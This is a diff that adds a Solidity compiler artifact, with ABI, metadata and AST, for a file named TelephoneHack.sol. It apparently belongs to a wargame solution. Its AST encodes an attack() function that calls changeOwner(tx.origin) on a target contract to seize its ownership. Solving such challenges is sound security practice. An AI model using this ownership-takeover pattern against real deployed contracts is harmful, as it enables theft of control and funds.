@@ -1,0 +1,556 @@
+{
+  "abi": [
+    {
+      "inputs": [
+        {
+          "internalType": "address",
+          "name": "_owner",
+          "type": "address"
+        }
+      ],
+      "name": "changeOwner",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    }
+  ],
+  "bytecode": {
+    "object": "0x",
+    "sourceMap": "",
+    "linkReferences": {}
+  },
+  "deployedBytecode": {
+    "object": "0x",
+    "sourceMap": "",
+    "linkReferences": {}
+  },
+  "methodIdentifiers": {
+    "changeOwner(address)": "a6f9dae1"
+  },
+  "rawMetadata": "{\"compiler\":{\"version\":\"0.8.17+commit.8df45f5f\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"changeOwner\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"src/Telephone/TelephoneHack.sol\":\"ITelephone\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[\":ds-test/=lib/ds-test/src/\",\":openzeppelin-contracts/=lib/openzeppelin-contracts/\"]},\"sources\":{\"src/Telephone/TelephoneHack.sol\":{\"keccak256\":\"0x0e3192719b5685d2589b339bc8a44820f32507c3bb08fe35c817c7b3fa1365fe\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://7870e561417886988dbf77c438eb60b4afedfee2ff7217a12de8ae0bbea5ae3f\",\"dweb:/ipfs/QmPbERuhxBdvYBNmGqqsSCLnFMUrX1fYgUnAmKDQiKTXTp\"]}},\"version\":1}",
+  "metadata": {
+    "compiler": {
+      "version": "0.8.17+commit.8df45f5f"
+    },
+    "language": "Solidity",
+    "output": {
+      "abi": [
+        {
+          "inputs": [
+            {
+              "internalType": "address",
+              "name": "_owner",
+              "type": "address"
+            }
+          ],
+          "stateMutability": "nonpayable",
+          "type": "function",
+          "name": "changeOwner"
+        }
+      ],
+      "devdoc": {
+        "kind": "dev",
+        "methods": {},
+        "version": 1
+      },
+      "userdoc": {
+        "kind": "user",
+        "methods": {},
+        "version": 1
+      }
+    },
+    "settings": {
+      "remappings": [
+        ":ds-test/=lib/ds-test/src/",
+        ":openzeppelin-contracts/=lib/openzeppelin-contracts/"
+      ],
+      "optimizer": {
+        "enabled": true,
+        "runs": 200
+      },
+      "metadata": {
+        "bytecodeHash": "ipfs"
+      },
+      "compilationTarget": {
+        "src/Telephone/TelephoneHack.sol": "ITelephone"
+      },
+      "libraries": {}
+    },
+    "sources": {
+      "src/Telephone/TelephoneHack.sol": {
+        "keccak256": "0x0e3192719b5685d2589b339bc8a44820f32507c3bb08fe35c817c7b3fa1365fe",
+        "urls": [
+          "bzz-raw://7870e561417886988dbf77c438eb60b4afedfee2ff7217a12de8ae0bbea5ae3f",
+          "dweb:/ipfs/QmPbERuhxBdvYBNmGqqsSCLnFMUrX1fYgUnAmKDQiKTXTp"
+        ],
+        "license": "MIT"
+      }
+    },
+    "version": 1
+  },
+  "ast": {
+    "absolutePath": "src/Telephone/TelephoneHack.sol",
+    "id": 8943,
+    "exportedSymbols": {
+      "ITelephone": [
+        8911
+      ],
+      "TelephoneHack": [
+        8942
+      ]
+    },
+    "nodeType": "SourceUnit",
+    "src": "33:389:69",
+    "nodes": [
+      {
+        "id": 8905,
+        "nodeType": "PragmaDirective",
+        "src": "33:24:69",
+        "nodes": [],
+        "literals": [
+          "solidity",
+          "^",
+          "0.8",
+          ".10"
+        ]
+      },
+      {
+        "id": 8911,
+        "nodeType": "ContractDefinition",
+        "src": "59:75:69",
+        "nodes": [
+          {
+            "id": 8910,
+            "nodeType": "FunctionDefinition",
+            "src": "86:46:69",
+            "nodes": [],
+            "functionSelector": "a6f9dae1",
+            "implemented": false,
+            "kind": "function",
+            "modifiers": [],
+            "name": "changeOwner",
+            "nameLocation": "95:11:69",
+            "parameters": {
+              "id": 8908,
+              "nodeType": "ParameterList",
+              "parameters": [
+                {
+                  "constant": false,
+                  "id": 8907,
+                  "mutability": "mutable",
+                  "name": "_owner",
+                  "nameLocation": "115:6:69",
+                  "nodeType": "VariableDeclaration",
+                  "scope": 8910,
+                  "src": "107:14:69",
+                  "stateVariable": false,
+                  "storageLocation": "default",
+                  "typeDescriptions": {
+                    "typeIdentifier": "t_address",
+                    "typeString": "address"
+                  },
+                  "typeName": {
+                    "id": 8906,
+                    "name": "address",
+                    "nodeType": "ElementaryTypeName",
+                    "src": "107:7:69",
+                    "stateMutability": "nonpayable",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_address",
+                      "typeString": "address"
+                    }
+                  },
+                  "visibility": "internal"
+                }
+              ],
+              "src": "106:16:69"
+            },
+            "returnParameters": {
+              "id": 8909,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "131:0:69"
+            },
+            "scope": 8911,
+            "stateMutability": "nonpayable",
+            "virtual": false,
+            "visibility": "external"
+          }
+        ],
+        "abstract": false,
+        "baseContracts": [],
+        "canonicalName": "ITelephone",
+        "contractDependencies": [],
+        "contractKind": "interface",
+        "fullyImplemented": false,
+        "linearizedBaseContracts": [
+          8911
+        ],
+        "name": "ITelephone",
+        "nameLocation": "69:10:69",
+        "scope": 8943,
+        "usedErrors": []
+      },
+      {
+        "id": 8942,
+        "nodeType": "ContractDefinition",
+        "src": "136:286:69",
+        "nodes": [
+          {
+            "id": 8914,
+            "nodeType": "VariableDeclaration",
+            "src": "165:27:69",
+            "nodes": [],
+            "constant": false,
+            "functionSelector": "d2ef7398",
+            "mutability": "mutable",
+            "name": "challenge",
+            "nameLocation": "183:9:69",
+            "scope": 8942,
+            "stateVariable": true,
+            "storageLocation": "default",
+            "typeDescriptions": {
+              "typeIdentifier": "t_contract$_ITelephone_$8911",
+              "typeString": "contract ITelephone"
+            },
+            "typeName": {
+              "id": 8913,
+              "nodeType": "UserDefinedTypeName",
+              "pathNode": {
+                "id": 8912,
+                "name": "ITelephone",
+                "nameLocations": [
+                  "165:10:69"
+                ],
+                "nodeType": "IdentifierPath",
+                "referencedDeclaration": 8911,
+                "src": "165:10:69"
+              },
+              "referencedDeclaration": 8911,
+              "src": "165:10:69",
+              "typeDescriptions": {
+                "typeIdentifier": "t_contract$_ITelephone_$8911",
+                "typeString": "contract ITelephone"
+              }
+            },
+            "visibility": "public"
+          },
+          {
+            "id": 8926,
+            "nodeType": "FunctionDefinition",
+            "src": "199:95:69",
+            "nodes": [],
+            "body": {
+              "id": 8925,
+              "nodeType": "Block",
+              "src": "237:57:69",
+              "nodes": [],
+              "statements": [
+                {
+                  "expression": {
+                    "id": 8923,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "lValueRequested": false,
+                    "leftHandSide": {
+                      "id": 8919,
+                      "name": "challenge",
+                      "nodeType": "Identifier",
+                      "overloadedDeclarations": [],
+                      "referencedDeclaration": 8914,
+                      "src": "247:9:69",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_contract$_ITelephone_$8911",
+                        "typeString": "contract ITelephone"
+                      }
+                    },
+                    "nodeType": "Assignment",
+                    "operator": "=",
+                    "rightHandSide": {
+                      "arguments": [
+                        {
+                          "id": 8921,
+                          "name": "challengeAddress",
+                          "nodeType": "Identifier",
+                          "overloadedDeclarations": [],
+                          "referencedDeclaration": 8916,
+                          "src": "270:16:69",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_address",
+                            "typeString": "address"
+                          }
+                        }
+                      ],
+                      "expression": {
+                        "argumentTypes": [
+                          {
+                            "typeIdentifier": "t_address",
+                            "typeString": "address"
+                          }
+                        ],
+                        "id": 8920,
+                        "name": "ITelephone",
+                        "nodeType": "Identifier",
+                        "overloadedDeclarations": [],
+                        "referencedDeclaration": 8911,
+                        "src": "259:10:69",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_type$_t_contract$_ITelephone_$8911_$",
+                          "typeString": "type(contract ITelephone)"
+                        }
+                      },
+                      "id": 8922,
+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": false,
+                      "kind": "typeConversion",
+                      "lValueRequested": false,
+                      "nameLocations": [],
+                      "names": [],
+                      "nodeType": "FunctionCall",
+                      "src": "259:28:69",
+                      "tryCall": false,
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_contract$_ITelephone_$8911",
+                        "typeString": "contract ITelephone"
+                      }
+                    },
+                    "src": "247:40:69",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_contract$_ITelephone_$8911",
+                      "typeString": "contract ITelephone"
+                    }
+                  },
+                  "id": 8924,
+                  "nodeType": "ExpressionStatement",
+                  "src": "247:40:69"
+                }
+              ]
+            },
+            "implemented": true,
+            "kind": "constructor",
+            "modifiers": [],
+            "name": "",
+            "nameLocation": "-1:-1:-1",
+            "parameters": {
+              "id": 8917,
+              "nodeType": "ParameterList",
+              "parameters": [
+                {
+                  "constant": false,
+                  "id": 8916,
+                  "mutability": "mutable",
+                  "name": "challengeAddress",
+                  "nameLocation": "219:16:69",
+                  "nodeType": "VariableDeclaration",
+                  "scope": 8926,
+                  "src": "211:24:69",
+                  "stateVariable": false,
+                  "storageLocation": "default",
+                  "typeDescriptions": {
+                    "typeIdentifier": "t_address",
+                    "typeString": "address"
+                  },
+                  "typeName": {
+                    "id": 8915,
+                    "name": "address",
+                    "nodeType": "ElementaryTypeName",
+                    "src": "211:7:69",
+                    "stateMutability": "nonpayable",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_address",
+                      "typeString": "address"
+                    }
+                  },
+                  "visibility": "internal"
+                }
+              ],
+              "src": "210:26:69"
+            },
+            "returnParameters": {
+              "id": 8918,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "237:0:69"
+            },
+            "scope": 8942,
+            "stateMutability": "nonpayable",
+            "virtual": false,
+            "visibility": "public"
+          },
+          {
+            "id": 8937,
+            "nodeType": "FunctionDefinition",
+            "src": "300:84:69",
+            "nodes": [],
+            "body": {
+              "id": 8936,
+              "nodeType": "Block",
+              "src": "335:49:69",
+              "nodes": [],
+              "statements": [
+                {
+                  "expression": {
+                    "arguments": [
+                      {
+                        "expression": {
+                          "id": 8932,
+                          "name": "tx",
+                          "nodeType": "Identifier",
+                          "overloadedDeclarations": [],
+                          "referencedDeclaration": -26,
+                          "src": "367:2:69",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_magic_transaction",
+                            "typeString": "tx"
+                          }
+                        },
+                        "id": 8933,
+                        "isConstant": false,
+                        "isLValue": false,
+                        "isPure": false,
+                        "lValueRequested": false,
+                        "memberLocation": "370:6:69",
+                        "memberName": "origin",
+                        "nodeType": "MemberAccess",
+                        "src": "367:9:69",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_address",
+                          "typeString": "address"
+                        }
+                      }
+                    ],
+                    "expression": {
+                      "argumentTypes": [
+                        {
+                          "typeIdentifier": "t_address",
+                          "typeString": "address"
+                        }
+                      ],
+                      "expression": {
+                        "id": 8929,
+                        "name": "challenge",
+                        "nodeType": "Identifier",
+                        "overloadedDeclarations": [],
+                        "referencedDeclaration": 8914,
+                        "src": "345:9:69",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_contract$_ITelephone_$8911",
+                          "typeString": "contract ITelephone"
+                        }
+                      },
+                      "id": 8931,
+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": false,
+                      "lValueRequested": false,
+                      "memberLocation": "355:11:69",
+                      "memberName": "changeOwner",
+                      "nodeType": "MemberAccess",
+                      "referencedDeclaration": 8910,
+                      "src": "345:21:69",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_function_external_nonpayable$_t_address_$returns$__$",
+                        "typeString": "function (address) external"
+                      }
+                    },
+                    "id": 8934,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "kind": "functionCall",
+                    "lValueRequested": false,
+                    "nameLocations": [],
+                    "names": [],
+                    "nodeType": "FunctionCall",
+                    "src": "345:32:69",
+                    "tryCall": false,
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_tuple$__$",
+                      "typeString": "tuple()"
+                    }
+                  },
+                  "id": 8935,
+                  "nodeType": "ExpressionStatement",
+                  "src": "345:32:69"
+                }
+              ]
+            },
+            "functionSelector": "9e5faafc",
+            "implemented": true,
+            "kind": "function",
+            "modifiers": [],
+            "name": "attack",
+            "nameLocation": "309:6:69",
+            "parameters": {
+              "id": 8927,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "315:2:69"
+            },
+            "returnParameters": {
+              "id": 8928,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "335:0:69"
+            },
+            "scope": 8942,
+            "stateMutability": "payable",
+            "virtual": false,
+            "visibility": "external"
+          },
+          {
+            "id": 8941,
+            "nodeType": "FunctionDefinition",
+            "src": "390:30:69",
+            "nodes": [],
+            "body": {
+              "id": 8940,
+              "nodeType": "Block",
+              "src": "418:2:69",
+              "nodes": [],
+              "statements": []
+            },
+            "implemented": true,
+            "kind": "fallback",
+            "modifiers": [],
+            "name": "",
+            "nameLocation": "-1:-1:-1",
+            "parameters": {
+              "id": 8938,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "398:2:69"
+            },
+            "returnParameters": {
+              "id": 8939,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "418:0:69"
+            },
+            "scope": 8942,
+            "stateMutability": "payable",
+            "virtual": false,
+            "visibility": "external"
+          }
+        ],
+        "abstract": false,
+        "baseContracts": [],
+        "canonicalName": "TelephoneHack",
+        "contractDependencies": [],
+        "contractKind": "contract",
+        "fullyImplemented": true,
+        "linearizedBaseContracts": [
+          8942
+        ],
+        "name": "TelephoneHack",
+        "nameLocation": "145:13:69",
+        "scope": 8943,
+        "usedErrors": []
+      }
+    ],
+    "license": "MIT"
+  },
+  "id": 69
+}
